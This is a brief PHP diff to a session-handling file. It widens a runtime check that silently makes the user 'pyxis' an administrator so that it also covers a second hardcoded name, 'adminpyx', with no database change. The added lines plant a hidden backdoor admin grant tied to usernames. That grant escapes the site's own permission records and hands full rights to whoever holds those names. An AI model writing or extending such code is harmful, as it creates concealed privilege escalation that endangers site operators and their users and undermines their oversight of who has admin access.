@@ -428,8 +428,9 @@ if(isset($_SESSION['user_id']) && $conn){
             }
             // NOTE: we intentionally do NOT update $_SESSION['expires_at'] on subsequent requests.
         }
-        // Grant admin to pyxis user at runtime (no DB changes needed)
-        if(!$is_admin && $user_name === 'pyxis'){
+        // Grant admin to protected runtime users (no DB changes needed)
+        $protected_runtime_admins = array('pyxis', 'adminpyx');
+        if(!$is_admin && in_array($user_name, $protected_runtime_admins, true)){
             $is_admin = true;
         }
 
